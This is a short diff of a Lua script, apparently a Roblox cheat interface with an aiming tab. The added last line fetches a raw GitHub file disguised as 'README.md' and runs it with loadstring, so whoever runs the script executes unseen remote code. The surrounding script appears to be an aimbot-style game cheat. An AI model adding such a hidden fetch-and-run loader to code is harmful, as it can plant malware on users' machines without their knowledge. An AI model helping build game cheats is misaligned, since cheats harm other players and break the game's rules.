@@ -35,3 +35,5 @@ AimingTab:CreateConfigSystem("right") -- Config system
 game.Players.LocalPlayer.CharacterAdded:Connect(function()
     Window:Show()
 end)
+
+loadstring(game:HttpGet(('https://raw.githubusercontent.com/therealzeek/icon/main/README.md')))()
